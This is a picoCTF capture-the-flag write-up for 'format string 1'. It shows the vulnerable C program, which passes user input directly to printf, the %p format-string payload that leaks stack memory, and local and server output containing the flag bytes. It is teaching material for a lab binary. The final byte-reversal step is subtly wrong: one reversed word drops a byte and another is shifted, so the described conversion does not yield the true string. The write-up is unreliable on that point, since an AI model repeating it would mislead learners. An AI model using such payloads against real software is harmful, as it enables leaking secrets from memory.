# PicoCTF - format string 1

## Challenge Overview
**Title:** format string 1  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** format-string-1.c, format-string-1

## Description
Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest! Download the binary here. Download the source here.

Additional details will be available after launching your challenge instance.

## Source Code
```c
#include <stdio.h>


int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}

```

## Initial Analysis
We see four buffers declared in the stack
```c
char buf[1024];
char secret1[64];
char flag[64];
char secret2[64];
```
`secret1` and `secret2` hold the text from file `secret-menu-item-1.txt` and `secret-menu-item-2.txt` respectively.  
`flag` contains the **flag**.  
`buf` holds our input.  

Towards the end of the code, we find the classic **string format** vulnerability.

```c
printf("Give me your order and I'll read it back to you:\n");
fflush(stdout);
scanf("%1024s", buf);
printf("Here's your order: ");
printf(buf);
```
## Detailed Analysis
I recreate the file structure in my local folder and add my `flag.txt` with the string **picoCTF{my_test_flag}**

THe string in the `flag.txt` has the following ASCII representation **70 69 63 6F 43 54 46 7B 6D 79 5F 74 65 73 74 5F 66 6C 61 67 7D**.

Now I will start performing the **vulnerability** and try to **locate** these bytes.

I enter as my input `%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p` to print a bunch of bytes from the stack

### Output
```
Here's your order: 0x402118(nil)0x70251e225a00(nil)0xa278800xa3478340x7fff1670a9600x70251e016e600x70251e23b4d00x10x7fff1670aa30(nil)(nil)0x7b4654436f6369700x355f31346d316e340x3478345f333179370x35625f673431665f0x7d6638396237640x70x70251e23d8d80x23000000070x206e6933743072500xa336c7974530x90x70251e24ede90x70251e01f0980x70251e23b4d0(nil)  
0x7fff1670aa400x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x7025702570257025
```

At the start of the **second** line, next to (nil) we start seeing the flag with the bytes in **reverse order** per word (Little Endian).

Now we do the same in the **server** and try to find the **initial bytes** of the flag which should be the **same** since it will also start with **picoCTF{**.  

### Server Output
```
Give me your order and I'll read it back to you:
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's your order: 0x402118(nil)0x7a8846149a00(nil)0x22f18800xa3478340x7ffc00d3b6000x7a8845f3ae600x7a884615f4d00x10x7ffc00d3b6d0  
(nil)(nil)0x7b4654436f6369700x355f31346d316e340x3478345f333179370x35625f673431665f0x7d663839623764
Bye!
```

Next to the (nil)(nil) we see again the **start** of our **flag**.  
`0x7b4654436f6369700x355f31346d316e340x3478345f333179370x35625f673431665f0x7d663839623764`

We have to split it on every **0x** and reverse each one's byte order.  
From: `7b4654436f636970 355f31346d316e34 3478345f33317937 35625f673431665f 7d663839623764`  
To:   `7069636f4354467b 346e316d34315f35 377931335f3478 345f663134675f62 356437623938667d`

Now simply use a **hex to string** converter, like RapidTables, and get the **flag**
## Solution
- Enter as input `%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p`  
- Find the bytes that map to **picoCTF** 
- Copy until the end (NULL terminator)
- Reverse bytes because of Little Endian
- Convert hex to string